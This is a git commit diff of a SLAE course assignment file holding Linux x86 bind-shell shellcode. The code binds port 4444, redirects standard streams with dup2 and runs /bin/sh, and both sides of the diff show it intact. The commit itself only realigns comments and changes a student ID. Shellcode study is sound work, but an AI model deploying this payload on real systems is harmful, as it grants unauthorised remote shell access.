88a7c69c52537b6e8b37c1ec8f3e0fe6e19c8cc9
xophidia <xophidia@gmail.com>
2018-01-14 18:14:14 +0100

    Update bindShellTCP.asm

--- Assignment 1/bindShellTCP.asm
+++ Assignment 1/bindShellTCP.asm
@@ -1,6 +1,6 @@
 ; SLAE - Assignment #1: Shell Bind TCP Shellcode (Linux/x86)
 ; Author: Alain Menelet 
-; StudentID - PA-3763
+; StudentID - SALE-3763
 ; Tested on Ubuntu 16.14.03 LTS
 ; https://github.com/xophidia/Shellcode/blob/master/compile.sh
 
@@ -13,34 +13,34 @@ _start:
 
 	; Create a socket
 
-	xor ebx, ebx 			; ebx = 0
+	xor ebx, ebx 				; ebx = 0
 	mul ebx					; eax=ebx=edx = 0
 	push ebx				; push 0 onto the stack
 	inc ebx					; ebx = 1
 	push ebx				; push 1 onto the stack
-	push byte 0x2			; push 2 onto the stack
-	mov ecx, esp			; set ecx to the address of our args
-	mov al, 0x66			; syscall socketcall
+	push byte 0x2				; push 2 onto the stack
+	mov ecx, esp				; set ecx to the address of our args
+	mov al, 0x66				; syscall socketcall
 	int 0x80				; make the syscall socketcall(socket(2,1,0))
 
 	; Bind to a port
 
-	xchg eax, edx			; save sockfd into edx
+	xchg eax, edx				; save sockfd into edx
 	pop ebx					; set ebx = 2 (bind)
 	pop esi					; pop 1
-	push word 0x5c11		; push 4444 port onto the stack
-	push word bx			; push 2 onto the stack
-	mov ecx, esp			; set ecx the address of our args
+	push word 0x5c11			; push 4444 port onto the stack
+	push word bx				; push 2 onto the stack
+	mov ecx, esp				; set ecx the address of our args
 	push 0x10				; push 16
 	push ecx				; push address of our args
 	push edx				; push sockfd
-	mov ecx, esp			; ecx = end of the stack
+	mov ecx, esp				; ecx = end of the stack
 	mov al, 0x66
 	int 0x80				; make the syscall  socketcall(bind(sockfd, [2,4444,0], 16))
 
 	; Listen a connection
 
-	mov [ecx+0x4], eax		; we use the stack (ebx is still in the stack and ecx+4 will set to 0)
+	mov [ecx+0x4], eax			; we use the stack (ebx is still in the stack and ecx+4 will set to 0)
 	mov bl, 0x4				; syscall listen
 	mov al, 0x66		
 	mov ecx, esp
@@ -48,7 +48,7 @@ _start:
 
 	; Accept
 
-	mov [ecx+0x8], eax		; we use the stack to put the second 0
+	mov [ecx+0x8], eax			; we use the stack to put the second 0
 	mov bl, 0x5				; syscall accept
 	mov al, 0x66	
 	mov ecx, esp
@@ -57,12 +57,12 @@ _start:
 
 	; Redirect stdin, stdout and stderr
 
-	xchg ebx, eax			; we save eax
+	xchg ebx, eax				; we save eax
 
 	xor ecx, ecx
 	mov cl, 0x2				; ecx = 2
 _:
-	mov al, 0x3f			; syscall dup2
+	mov al, 0x3f				; syscall dup2
 	int 0x80
 	dec ecx
 	jns _
@@ -72,9 +72,9 @@ _:
 	xor ecx,ecx				; ecx = 0
 	mul ecx					; eax = edx =ecx = 0
 	push eax				; push 0 onto the stack
-	push 0x68732f2f			; push //bin/sh
+	push 0x68732f2f				; push //bin/sh
 	push 0x6e69622f
-	mov ebx, esp			; save esp into ebx
+	mov ebx, esp				; save esp into ebx
 	mov al, 0xb		
 	int 0x80				; make the syscall execve("/bin/sh", NULL, NULL)
 
